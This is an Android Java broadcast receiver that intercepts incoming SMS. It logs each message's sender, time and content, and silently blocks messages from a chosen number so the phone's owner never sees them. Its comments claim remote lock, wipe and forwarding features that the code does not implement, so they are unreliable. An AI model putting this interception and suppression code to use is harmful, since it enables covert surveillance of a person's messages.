package com.android.base.globalreceiver;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

/**
 * 短信安全控制器，使用短信命令进行手机控制 主要包括锁屏，密码设置，数据擦除，摄像头禁用
 */
public class SMSInterceptReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");// 获取短信内容
		for (Object pdu : pdus) {
			byte[] data = (byte[]) pdu;// 获取单条短信内容，短信内容以pdu格式存在
			SmsMessage message = SmsMessage.createFromPdu(data);// 使用pdu格式的短信数据生成短信对象
			String sender = message.getOriginatingAddress();// 获取短信的发送者
			String content = message.getMessageBody();// 获取短信的内容
			Date date = new Date(message.getTimestampMillis());
			SimpleDateFormat format = new SimpleDateFormat(
					"yyyy-MM-dd HH:mm:ss");
			String sendtime = format.format(date);
			System.out.println("发送人:" + sender+ "-----发送时间:" + sendtime + "----内容:" + content);// 把拦截到的短信发送到你指定的手机，此处为5556
			// 如果不想让机主接收到某个号码的短信,可以取消这段注释， number 为指定的号码,也可在此处给这个号码回复的内容。。。。。
			if ("number".equals(sender)) {
				abortBroadcast();
			}
		}

	}
}
